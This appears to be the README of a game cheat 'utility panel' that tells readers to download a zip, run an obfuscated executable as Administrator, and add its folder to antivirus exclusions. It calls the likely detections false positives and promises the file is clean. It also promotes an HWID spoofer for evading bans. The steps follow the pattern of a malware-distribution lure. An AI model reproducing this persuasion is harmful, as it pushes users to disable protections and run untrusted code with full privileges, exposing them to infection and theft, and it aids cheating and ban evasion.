# 🚀 RR-Client | Official Utility Panel

Welcome to **RR-Client**! This project started as a personal tool to enhance in-game performance and visual clarity, and it has now evolved into a fully-fledged, user-friendly utility panel. 

Built with performance in mind, RR-Client runs smoothly in the background without any noticeable impact on your game's FPS or system resources. We focused heavily on stability and safety, ensuring that the tool operates entirely externally without deep modifications to the game files.

## ⚙️ How to Install & Use

Getting started is quick and easy. Just follow the steps below:

1. Head over to the **Releases** section on the right side of this page.
2. Download the latest version: `RRTool_Public_NoKey_Release_.zip`.
3. Extract the downloaded archive to a safe folder on your PC (the Desktop is usually best).
4. Locate `RobRunAIQ.exe` inside the folder.
5. Right-click on it and select **"Run as Administrator"** (this is required for the panel to attach properly).
6. Launch the game, and the interface will be ready for you.

## 🛡️ Security & Transparency

We know how sketchy some tools can look, so here is the truth:
- The software is completely clean. No hidden miners, no malware, no data-stealing bullshit.
- The file is obfuscated to prevent skidding and unauthorized modifications, which is why some antivirus engines might throw false positives. We recommend checking the VirusTotal scan if you have doubts.
- We are strictly against any form of account phishing or credential logging. 

## 🔄 Updates & Maintenance

Game developers push updates frequently. If the panel stops working or the game crashes, it means the offsets need updating. 
- Don't panic, we usually push a new release within 24-48 hours after a major game patch.
- Make sure to check the Releases tab regularly to stay on the latest version.

## ⚠️ Important Notes
- This software is designed exclusively for **Windows 10 and Windows 11**.
- Make sure your antivirus doesn't quarantine the loader (add the folder to exclusions if needed).
- Use it at your own risk. The developers are not responsible for any account bans, though the HWID spoofer is built to minimize this risk as much as possible.
